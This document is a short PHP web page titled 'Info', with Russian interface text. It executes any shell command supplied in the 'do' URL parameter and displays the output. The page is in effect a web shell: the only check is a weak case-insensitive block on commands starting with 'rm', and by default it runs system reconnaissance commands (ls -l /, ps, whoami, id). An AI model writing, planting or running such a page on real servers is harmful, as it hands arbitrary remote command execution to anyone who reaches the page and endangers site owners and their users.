<html>

<head>
    <title>Info</title>
    <link href="./style.css" rel="stylesheet">
</head>

<body>
    <?php
    function executeToWeb(string $cmd)
    {
        print("<p>Вывод команды <b>$cmd</b><div class=\"terminal\">");
        exec($cmd, $output, $code);
        foreach ($output as $key => $value) {
            print(htmlspecialchars($value) . '<br>');
        }
        print("</div>Код возврата: $code</p>");
        return $code;
    }

    if (isset($_GET['do'])) {
        function startsWith($haystack, $needle)
        {
            $length = strlen($needle);
            return strtolower(substr($haystack, 0, $length)) === strtolower($needle);
        }

        if (!startsWith($_GET['do'], 'rm')) {
            executeToWeb($_GET['do']);
        } else {
            print('Исполнение данной команды не разрешено');
        }
    } else {
        print('Команда может быть задана в параметре "do"<br>');
        foreach (['ls -l /', 'ps', 'whoami', 'id'] as $key => $value) {
            executeToWeb($value);
        }
    }
    ?>
</body>

</html>